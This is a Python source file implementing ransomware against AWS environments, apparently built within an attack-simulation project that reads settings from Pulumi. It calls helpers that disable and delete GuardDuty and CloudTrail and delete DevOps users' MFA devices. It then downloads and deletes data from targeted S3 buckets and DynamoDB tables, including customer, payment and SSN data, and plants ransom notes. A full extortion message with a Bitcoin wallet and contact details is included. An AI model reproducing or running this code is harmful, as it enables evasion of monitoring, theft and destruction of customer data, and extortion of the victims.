import boto3
import json
import os
import time
from DisableGD_CT import disable_guardduty, stop_cloudtrail_logging, delete_guardduty, delete_cloudtrail
from MFA import delete_virtualMFA_device
from Load_Pulumi_Outputs import get_pulumi_output


ransom_message = """YOUR DATA HAS BEEN TAKEN.

All of your files stored in this AWS environment have been **copied** and **permanently deleted** from your cloud storage. We now hold the ONLY remaining copy.

### WHAT HAPPENED?
- Your sensitive data was extracted and removed.
- Recovery from backups? We have **infiltrated** your AWS environment—attempting restoration will be futile.
- We control the fate of your files.

### HOW TO GET YOUR DATA BACK:
To retrieve your stolen data, you must pay **$50,000 USD** in **Bitcoin (BTC)** to the address below:

**Bitcoin Wallet Address:** 1FfmbHfnpaZjKFvyi1okTjJJusN455paPH  
(Network: BTC)

### DEADLINE: 72 HOURS  
Failure to comply within **72 hours** will result in **public exposure** of your data. Your confidential files will be leaked online and potentially sold to competitors.

### HOW TO CONTACT US:
For proof that we hold your data or further instructions, contact us via:

**TOR Secure Chat:** hxxp://ransomchatxyz.onion  
**Email:** support@securemail.pro

DO NOT attempt recovery or involve AWS security—this will result in immediate **data exposure**.

YOU HAVE BEEN WARNED.
"""


class Ransomware:
    """Handles AWS session initialization and attack modules for S3 and DynamoDB"""

    def __init__(self, access_key, secret_key, region='us-east-1'):


        # Ensure AWS picks up only the new credentials by deleting
        # any previous sessions in the global python runtime, 
        # this is cruicial for transferring sessions to expand
        # to other users in multi-user encompassing attack vectors
        boto3.setup_default_session()

        # AWS IAM propagation delay
        print(" Waiting for IAM propagation...")
        time.sleep(5)  # Add a delay before using new credentials


        """Initialize a boto3 session with given credentials"""
        # This is the newly created user for ransomware that got admin 
        # privileges attached to it for s3 & dynamodb
        self.session = boto3.Session(
            aws_access_key_id=access_key,
            aws_secret_access_key=secret_key,
            region_name=region
        )
        
        # Initialize attack modules for variable reference in Ransomware class imports
        self.s3_drain = self.S3_Drain_Delete(self.session)
        self.dynamodb_drain = self.DynamoDB_Drain_Delete(self.session)


        # Dynamically fetching GuardDuty and CloudTrail details from Pulumi outputs 
        self.guardduty_id = get_pulumi_output("gd_detector_id")  
        self.cloudtrail_name = get_pulumi_output("cloudtrail_name") 



        # Dynamically fetching DevOps Team MFA ARNs to delete by user run_while_you_can
        """
        These users are the backdrop to the larger vector, in that user: DevopUser
        is compromised via access-key purchase & MFA pfishing, then creates a user
        and attaches an inline policy aloowing it to remove MFA device, and will 
        remove the virtual MFA device of each of his team members to initialize 
        MFA Tampering DDOS as part of the larger vector.
        """
        self.devops_mfa_arns = {
            username: get_pulumi_output(f"{username}_mfa_arn")
            for username in ["DevopsDeploy", "DevopsAutomation", "DevopsMonitor", "DevopsPipeline"]
        }



    def session_test(self):
        """Test the AWS session by getting caller identity"""
        try:
            sts_client = self.session.client("sts")
            identity = sts_client.get_caller_identity()
            print(f" Confirmed AWS Identity: {identity['Arn']}")
            return True
        except Exception as e:
            print(f" ERROR: Invalid session credentials: {e}")
            return False

    def disable_guardduty(self):
        """Executes GuardDuty disable and CloudTrail logging stop"""
        disable_guardduty(self.session, self.guardduty_id)

    def stop_cloudtrail_logging(self):
        """Executes GuardDuty disable and CloudTrail logging stop"""
        stop_cloudtrail_logging(self.session, self.cloudtrail_name)
    

    def delete_guardduty(self):
        delete_guardduty(self.session, self.guardduty_id)

    def delete_cloudtrail(self):
        delete_cloudtrail(self.session, self.cloudtrail_name)



    def devops_team_MFA_DDOS(self):
        for username, mfa_arn in self.devops_mfa_arns.items():
            print(f"Initiating deletion of MFA for {username}...")
            delete_virtualMFA_device(self.session, mfa_arn)



    
    # class S3_Drain_Delete:
    #     def __init__(self, session):
    #         """Initialize S3 client and target S3 buckets"""
    #         self.s3_client = session.client('s3')
    #         self.target_buckets = self.get_target_s3_buckets()

    #     def get_target_s3_buckets(self):
    #         """Fetch all S3 buckets & filter by predefined naming patterns"""
    #         all_buckets = self.s3_client.list_buckets().get('Buckets', [])

    #         # Convert Pulumi bucket names to lowercase for comparison
    #         s3_target_patterns = [
    #             "company-data-q1-2024", "company-data-q2-2024",
    #             "company-data-q3-2024", "company-data-q4-2024",
    #             "configuration-files", "customer-data", "payment-data"
    #         ]

    #         target_buckets = [
    #             bucket['Name'] for bucket in all_buckets
    #             if any(bucket['Name'].lower().startswith(pattern) for pattern in s3_target_patterns)
    #         ]

    #         print("Target S3 Buckets:", target_buckets)
    #         return target_buckets


    #     def search_and_exfiltrate(self, exfiltration_path="./s3_Exfiltration"):
    #         """Downloads all objects from targeted buckets, deletes them, and leaves a ransom note"""
    #         os.makedirs(exfiltration_path, exist_ok=True)
    #         for bucket in self.target_buckets:
    #             objects = self.s3_client.list_objects_v2(Bucket=bucket).get('Contents', [])
    #             for obj in objects:
    #                 key = obj['Key']
    #                 file_path = os.path.join(exfiltration_path, f"{bucket}_{key.replace('/', '_')}.json")
    #                 self.s3_client.download_file(bucket, key, file_path)
    #                 print(f"Downloaded: {key} from {bucket}")
    #                 self.s3_client.delete_object(Bucket=bucket, Key=key)
    #                 print(f"Deleted: {key} from {bucket}")
    #             ransom_note = ransom_message
    #             self.s3_client.put_object(Bucket=bucket, Key="too_late.txt", Body=ransom_note)
    #             print(f"Ransom note placed in {bucket}")


    class S3_Drain_Delete:
        def __init__(self, session):
            """Initialize S3 client and target S3 buckets"""
            self.s3_client = session.client('s3')
            self.target_buckets = self.get_target_s3_buckets()
            self.object_keys = {}  # Stores bucket-object mappings for deletion

        def get_target_s3_buckets(self):
            """Fetch all S3 buckets & filter by predefined naming patterns"""
            all_buckets = self.s3_client.list_buckets().get('Buckets', [])

            # Convert Pulumi bucket names to lowercase for comparison
            s3_target_patterns = [
                "company-data-q1-2024", "company-data-q2-2024",
                "company-data-q3-2024", "company-data-q4-2024",
                "configuration-files", "customer-data", "payment-data"
            ]

            target_buckets = [
                bucket['Name'] for bucket in all_buckets
                if any(bucket['Name'].lower().startswith(pattern) for pattern in s3_target_patterns)
            ]

            print("Target S3 Buckets:", target_buckets)
            return target_buckets

        def exfiltrate(self, exfiltration_path="./s3_Exfiltration"):
            """Step 1: Exfiltrates (downloads) all objects from targeted buckets"""
            os.makedirs(exfiltration_path, exist_ok=True)
            self.object_keys.clear()  # Reset object_keys before exfiltration

            print("\n[*] Starting Exfiltration...")
            for bucket in self.target_buckets:
                objects = self.s3_client.list_objects_v2(Bucket=bucket).get('Contents', [])
                if not objects:
                    print(f"[*] No objects found in {bucket}. Skipping...")
                    continue

                self.object_keys[bucket] = [obj['Key'] for obj in objects]

                for key in self.object_keys[bucket]:
                    file_path = os.path.join(exfiltration_path, f"{bucket}_{key.replace('/', '_')}.json")
                    self.s3_client.download_file(bucket, key, file_path)
                    print(f"[✔] Exfiltrated: {key} from {bucket}")

        def delete_objects(self):
            """Step 2: Deletes all exfiltrated objects from the targeted buckets"""
            print("\n[*] Starting Deletion...")
            if not self.object_keys:
                print("No objects recorded for deletion. Ensure exfiltration was run first.")
                return

            for bucket, keys in self.object_keys.items():
                for key in keys:
                    self.s3_client.delete_object(Bucket=bucket, Key=key)
                    print(f"[✔] Deleted: {key} from {bucket}")

        def place_ransom_note(self, ransom_message="Your files have been encrypted!"):
            """Step 3: Places ransom note in each affected bucket"""
            print("\n[*] Tampering - Dropping ransom notes...")
            for bucket in self.target_buckets:
                self.s3_client.put_object(Bucket=bucket, Key="too_late.txt", Body=ransom_message)
                print(f"[✔] Ransom note placed in {bucket}")


        # Example usage:
        # session = boto3.Session()
        # s3_attack = S3_Drain_Delete(session)
        # s3_attack.exfiltrate()  # Step 1: Download all data
        # s3_attack.delete_objects()  # Step 2: Delete all downloaded data
        # s3_attack.place_ransom_note()  # Step 3: Leave ransom note






    # class DynamoDB_Drain_Delete:
    #     def __init__(self, session):
    #         """Initialize DynamoDB client and target tables"""
    #         self.dynamodb_client = session.client('dynamodb')
    #         self.dynamodb_resource = session.resource('dynamodb')
    #         self.target_tables = self.get_target_dynamodb_tables()

    #     def get_target_dynamodb_tables(self):
    #         """Fetch all DynamoDB tables & filter by predefined naming patterns"""
    #         all_tables = self.dynamodb_client.list_tables().get('TableNames', [])
    #         dynamodb_target_patterns = ["CustomerOrdersTable", "CustomerSSNTable"]
    #         target_tables = [table for table in all_tables if any(pattern in table for pattern in dynamodb_target_patterns)]
    #         return target_tables



    #     def search_and_exfiltrate(self, exfiltration_path="./DynamoDB_Exfiltration"):
    #         """Extracts, deletes tables, creates a new 'too_late' table ONCE, and inserts ransom notes."""
    #         os.makedirs(exfiltration_path, exist_ok=True)

    #         # Step 1: Loop Through Each Table & Delete
    #         for table_name in self.target_tables:
    #             table = self.dynamodb_resource.Table(table_name)

    #             # Step 1.1: Scan & Exfiltrate Data
    #             scan_response = table.scan()
    #             data = scan_response.get('Items', [])

    #             if data:
    #                 file_path = os.path.join(exfiltration_path, f"{table_name}.json")
    #                 with open(file_path, 'w') as f:
    #                     json.dump(data, f, indent=4)
    #                 print(f"Extracted data from {table_name} to {file_path}")

    #             # Step 1.2: Delete the Original Table
    #             self.dynamodb_client.delete_table(TableName=table_name)
    #             print(f"Deleting table: {table_name}...")

    #             # Wait until the table is fully deleted
    #             while True:
    #                 try:
    #                     self.dynamodb_client.describe_table(TableName=table_name)
    #                     time.sleep(5)  # Wait and retry
    #                 except self.dynamodb_client.exceptions.ResourceNotFoundException:
    #                     print(f"Table {table_name} fully deleted.")
    #                     break
                    
    #         # Step 2: Ensure "too_late" Exists **Before** Inserting Data
    #         new_table_name = "too_late"
    #         try:
    #             self.dynamodb_client.describe_table(TableName=new_table_name)
    #             print(f"Table '{new_table_name}' already exists. Skipping creation...")
    #         except self.dynamodb_client.exceptions.ResourceNotFoundException:
    #             print(f"Creating new table: {new_table_name}...")

    #             self.dynamodb_client.create_table(
    #                 TableName=new_table_name,
    #                 KeySchema=[{"AttributeName": "ID", "KeyType": "HASH"}],  # Simple primary key
    #                 AttributeDefinitions=[{"AttributeName": "ID", "AttributeType": "S"}],
    #                 BillingMode="PAY_PER_REQUEST"
    #             )

    #             # Step 2.1: Wait for the table to be fully created
    #             while True:
    #                 try:
    #                     response = self.dynamodb_client.describe_table(TableName=new_table_name)
    #                     if response["Table"]["TableStatus"] == "ACTIVE":
    #                         break
    #                 except Exception as e:
    #                     pass
    #                 time.sleep(5)

    #             print(f"New table {new_table_name} created successfully.")

    #         # Step 3: Insert Ransom Note into "too_late"
    #         for table_name in self.target_tables:
    #             ransom_note = {
    #                 "ID": f"{table_name}_RANSOM_NOTE",  # Fix: Ensure "ID" is a string
    #                 "Message": f"Your data from {table_name} has been exfiltrated & deleted... {ransom_message}"
    #             }

    #             # Ensure "too_late" is ready before inserting ransom note
    #             try:
    #                 self.dynamodb_resource.Table(new_table_name).put_item(Item=ransom_note)
    #                 print(f"Ransom note inserted into {new_table_name} for {table_name}.")
    #             except Exception as e:
    #                 print(f"ERROR inserting ransom note: {e}")


    class DynamoDB_Drain_Delete:
        def __init__(self, session):
            """Initialize DynamoDB client and target tables"""
            self.dynamodb_client = session.client('dynamodb')
            self.dynamodb_resource = session.resource('dynamodb')
            self.target_tables = self.get_target_dynamodb_tables()
            self.exfiltrated_data = {}  # Stores extracted data before deletion

        def get_target_dynamodb_tables(self):
            """Fetch all DynamoDB tables & filter by predefined naming patterns"""
            all_tables = self.dynamodb_client.list_tables().get('TableNames', [])

            # Define patterns for targeted tables
            target_patterns = ["CustomerOrdersTable", "CustomerSSNTable"]

            target_tables = [table for table in all_tables if any(table.startswith(pattern) for pattern in target_patterns)]
            print("Target DynamoDB Tables:", target_tables)
            return target_tables

        def exfiltrate(self, exfiltration_path="./DynamoDB_Exfiltration"):
            """Step 1: Extracts all data from targeted tables before deletion"""
            os.makedirs(exfiltration_path, exist_ok=True)
            self.exfiltrated_data.clear()  # Reset data before exfiltration

            print("\n[*] Starting Data Exfiltration...")
            for table_name in self.target_tables:
                table = self.dynamodb_resource.Table(table_name)
                scan_response = table.scan()
                data = scan_response.get('Items', [])

                if data:
                    file_path = os.path.join(exfiltration_path, f"{table_name}.json")
                    with open(file_path, 'w') as f:
                        json.dump(data, f, indent=4)
                    print(f"[✔] Exfiltrated data from {table_name} to {file_path}")
                    self.exfiltrated_data[table_name] = data  # Store for potential ransom notes
                else:
                    print(f"[*] No data found in {table_name}. Skipping...")

        def delete_tables(self):
            """Step 2: Deletes all exfiltrated DynamoDB tables"""
            print("\n[*] Starting Table Deletion...")
            for table_name in self.target_tables:
                print(f"[*] Deleting table: {table_name}...")
                self.dynamodb_client.delete_table(TableName=table_name)

                # Wait until the table is fully deleted
                while True:
                    try:
                        self.dynamodb_client.describe_table(TableName=table_name)
                        time.sleep(5)  # Wait and retry
                    except self.dynamodb_client.exceptions.ResourceNotFoundException:
                        print(f"[✔] Table {table_name} fully deleted.")
                        break

        def create_ransom_table(self, ransom_table_name="too_late"):
            """Step 3: Ensures the ransom table ('too_late') exists before inserting ransom notes"""
            print(f"\n[*] Ensuring ransom table '{ransom_table_name}' exists...")
            try:
                self.dynamodb_client.describe_table(TableName=ransom_table_name)
                print(f"[✔] Table '{ransom_table_name}' already exists. Skipping creation...")
            except self.dynamodb_client.exceptions.ResourceNotFoundException:
                print(f"[*] Creating new ransom table: {ransom_table_name}...")

                self.dynamodb_client.create_table(
                    TableName=ransom_table_name,
                    KeySchema=[{"AttributeName": "ID", "KeyType": "HASH"}],
                    AttributeDefinitions=[{"AttributeName": "ID", "AttributeType": "S"}],
                    BillingMode="PAY_PER_REQUEST"
                )

                # Wait for the table to be fully created
                while True:
                    try:
                        response = self.dynamodb_client.describe_table(TableName=ransom_table_name)
                        if response["Table"]["TableStatus"] == "ACTIVE":
                            print(f"[✔] Ransom table '{ransom_table_name}' created successfully.")
                            break
                    except Exception:
                        pass
                    time.sleep(5)

        def insert_ransom_note(self, ransom_table_name="too_late", ransom_message="Your data has been exfiltrated & deleted!"):
            """Step 4: Inserts ransom notes into the 'too_late' table"""
            print("\n[*] Inserting ransom notes into the ransom table...")
            for table_name in self.target_tables:
                ransom_note = {
                    "ID": f"{table_name}_RANSOM_NOTE",
                    "Message": f"Your data from {table_name} has been exfiltrated & deleted... {ransom_message}"
                }

                try:
                    self.dynamodb_resource.Table(ransom_table_name).put_item(Item=ransom_note)
                    print(f"[✔] Ransom note inserted for {table_name}.")
                except Exception as e:
                    print(f"[ERROR] Failed to insert ransom note for {table_name}: {e}")


    # Example usage:
    # session = boto3.Session()
    # dynamo_attack = DynamoDB_Drain_Delete(session)
    # dynamo_attack.exfiltrate()  # Step 1: Extract all data before deletion
    # dynamo_attack.delete_tables()  # Step 2: Delete all extracted tables
    # dynamo_attack.create_ransom_table()  # Step 3: Ensure ransom table exists
    # dynamo_attack.insert_ransom_note()  # Step 4: Insert ransom note
